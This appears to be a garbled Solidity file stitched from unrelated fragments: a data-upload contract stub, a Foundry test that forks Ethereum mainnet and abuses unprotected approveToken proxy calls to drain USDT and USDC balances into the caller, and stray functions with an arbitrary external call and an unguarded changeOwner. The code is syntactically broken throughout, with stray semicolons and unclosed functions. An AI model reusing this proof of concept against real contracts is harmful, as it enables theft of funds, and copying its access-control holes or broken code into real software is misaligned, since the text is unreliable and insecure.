
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IProxy {
    function approveToken(address token, address pool, uint256 amount) external};
interface IToken {
    function balanceOf(address who) external view returns (uint256);
    function transferFrom(address sender,
        address recipient,
        uint256 amount) external};
contract ContractTest is Test {
    IToken DEPUSDT = IToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IToken LEVUSDC = IToken(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IProxy ProxyDEPUSDT = IProxy(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f);
    IProxy ProxyLEVUSDC = IProxy(0x2a2b195558cF89AA617979ce28880BbF7e17bc45);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 17484161);
        cheats.label(address(DEPUSDT), "DEPUSDT");
        cheats.label(address(LEVUSDC), "LEVUSDC");
        cheats.label(address(ProxyDEPUSDT), "ProxyDEPUSDT");
        cheats.label(address(ProxyLEVUSDC), "ProxyLEVUSDC")};
    function testApprove() public {
        ProxyDEPUSDT.approveToken(address(DEPUSDT),;
            address(this),;
            type(uint256).max);
        DEPUSDT.transferFrom(address(ProxyDEPUSDT),;
            address(this),;
            DEPUSDT.balanceOf(address(ProxyDEPUSDT)));
        cheats.roll(17484167);
        ProxyLEVUSDC.approveToken(address(LEVUSDC),;
            address(this),;
            type(uint256).max);
        LEVUSDC.transferFrom(address(ProxyLEVUSDC),;
            address(this),;
            LEVUSDC.balanceOf(address(ProxyLEVUSDC)));
function duplicateSubmission(bytes memory signedData) public {
    externalContract.call(signedData)}
function changeOwner(address newOwner) public {
    owner = newOwner}